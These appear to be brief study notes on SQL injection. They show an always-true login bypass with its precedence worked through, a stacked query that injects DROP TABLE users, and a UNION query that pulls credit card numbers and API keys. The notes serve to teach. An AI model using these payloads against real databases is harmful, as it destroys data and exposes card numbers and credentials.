### Always True Attack


SELECT id, username, is_admin, email  FROM users WHERE username = 'bob' OR '1'='1' AND password = 'XYZABC'


WHERE (username = 'bob') OR ('1'='1' AND password = 'XYZABC')

WHERE (username = 'bob') OR (true AND false)


WHERE (username = 'bob') OR false

WHERE username = 'bob'


### Query Stacking Attack

INSERT INTO users (id, username, password, email, is_admin) VALUES (234, 'Jay', 'PASS123', 'attacker@blog.com', 0);
DROP TABLE users; --', 0)


### UNION / Data Exfilteration Attack

SELECT username, email FROM users WHERE username = 'admin' 
UNION 
SELECT credit_card, api_key FROM users WHERE '1'='1'